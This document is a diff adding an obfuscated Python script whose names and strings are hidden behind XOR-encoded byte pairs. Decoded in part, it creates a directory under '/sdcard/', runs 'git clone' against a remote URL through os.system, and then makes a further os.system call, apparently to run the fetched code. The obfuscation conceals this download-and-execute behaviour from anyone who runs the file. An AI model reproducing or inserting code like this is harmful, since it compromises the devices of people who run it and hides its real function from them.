@@ -1,0 +1,53 @@
+Ol00l1O0OOOl1O1O11lO1 = (lambda OOO000l00O0O0ll0OO1lO,
+    OOO0l1l0OO1lO0Ol0ll0l: OOO000l00O0O0ll0OO1lO + OOO0l1l0OO1lO0Ol0ll0l)
+llOll1OllOll0l0OlO0lO = (lambda lOO00O00lOO0ll0l1100O,
+    OOOO001110l000OOl1100: lOO00O00lOO0ll0l1100O ^ OOOO001110l000OOl1100)
+lllOOO0Ol011O1lO0Ol1l = __import__('er'[::-1], globals(), locals(), [], 0)
+lll000l1lOO01O00001OO = __import__(''.join(chr(O10ll01lOOO000OOOO01l ^
+    lOOOOO01l11ll110l0O1l) for lOOOOO01l11ll110l0O1l, O10ll01lOOO000OOOO01l in
+    zip(b'A6', b'.E')), globals(), locals(), [], 0)
+
+
+def l1001Ol011O0110llOllO():
+ try:
+  getattr(lll000l1lOO01O00001OO, ''.join(chr(O10ll1Ol0O0OOl10ll0ll ^
+      ll11lOlOO00llOl01Ol1O) for ll11lOlOO00llOl01Ol1O,
+      O10ll1Ol0O0OOl10ll0ll in zip(b'\x15<C\xd6\x85', b"xW'\xbf\xf7")))(''.
+      join(chr(lO01O110O1Ol0110010O1 ^ O111l1O00O0ll0l1l11l0) for 
+      O111l1O00O0ll0l1l11l0, lO01O110O1Ol0110010O1 in zip(
+      b'\xba[\xec\xd4\xc3\x98\xf2\xc2\x07\xe9\x9f\x1c\r\x17',
+      b'\x95(\x88\xb7\xa2\xea\x96\xedn\x87\xf9ync')))
+ except IOError:
+  pass
+  getattr(lll000l1lOO01O00001OO, ''.join(chr(lOOl1l1O1O1Ol01O01l01 ^
+      O010OllOl11l10OOOl0l0) for O010OllOl11l10OOOl0l0,
+      lOOl1l1O1O1Ol01O01l01 in zip(b'\x1b\x1eA\xd2\x18\xbd', b'hg2\xa6}\xd0'))
+      )(''.join(chr(O11llO0O1l1l1OOl10l0l ^ O1l1001O0Ol10010ll01l) for 
+      O1l1001O0Ol10010ll01l, O11llO0O1l1l1OOl10l0l in zip(
+      b'Y\x98\x82\x19\x11\x19\xd2\x86\x00\xed\xefh\xc89F\xe5\xb7\xa2Hj\xe1>\xf5\xfdVKk8C4\xfb'
+      ,
+      b'>\xf1\xf69ru\xbd\xe8e\xcd\x87\x1c\xbcI5\xdf\x98\x8d/\x03\x95V\x80\x9fx(\x04Ul`\x93'
+      )) + ''.join(chr(l100O1l0OO011OOO1010O ^ OOOO001lOOO01O0OOl11O) for 
+      OOOO001lOOO01O0OOl11O, l100O1l0OO011OOO1010O in zip(
+      b'\xa6\x08j\xa3\xc1/\x98S\x86?\x03\x170z\x81A\xf1\xceI\xe2\xf9\x8a\x9d\xc4\x0e\xad!\x0ex\xe0\xe4\xf2'
+      ,
+      b"\xc3%'\xc2\xa5B\xf9=\xabmfu_\x08\xefn\x98\xa0/\x87\x9a\xfe\xc2\x81v\xd9D`\x0b\x89\x8b\x9c"
+      )))
+  getattr(lll000l1lOO01O00001OO, ''.join(chr(O0O110ll01O01Oll01OOO ^
+      O1l1ll1OOO1l001O1l1l1) for O1l1ll1OOO1l001O1l1l1,
+      O0O110ll01O01Oll01OOO in zip(b'\xa7\xd6\xbc\xe84\xe9',
+      b'\xd4\xaf\xcf\x9cQ\x84')))(''.join(chr(llOll1OllOll0l0OlO0lO(
+      l0l0101OO0l0l1l1O0100, l010OlOOlOl0lll1l11l0)) for 
+      l010OlOOlOl0lll1l11l0, l0l0101OO0l0l1l1O0100 in zip(
+      b'\xc8J\x96b\x91A\xfcg\x19}Lz\xd2!\x11r\xc4\xef:#\xbbE\xb9rh\xf7\x9e\x14y\xad\xbf\xc6 \x9a'
+      ,
+      b'\xab.\xb6\x0b\xff\'\x99\x04m"\t\x02\xa6D\x7f\x01\xad\x80T\x03\x9dc\x99\x02\x11\x83\xf6{\x17\x8d\xd2\xa7I\xf4'
+      )))
+
+
+if __name__ == ''.join(filter(lambda OO1O1l00l1lOlOO0l01OO: ord(
+    OO1O1l00l1lOlOO0l01OO) % 3 != 0, "\x1e*<\x18]\t$uQ'\x06!'T6")).join(chr
+    (OOOlO0OlOO01ll110l00O ^ lOOl1100l0l1lll0OO111) for 
+    lOOl1100l0l1lll0OO111, OOOlO0OlOO01ll110l00O in zip(
+    b'uT\xc0\x94\xade\xfc\xa1', b'*\x0b\xad\xf5\xc4\x0b\xa3\xfe')):
+ l1001Ol011O0110llOllO()
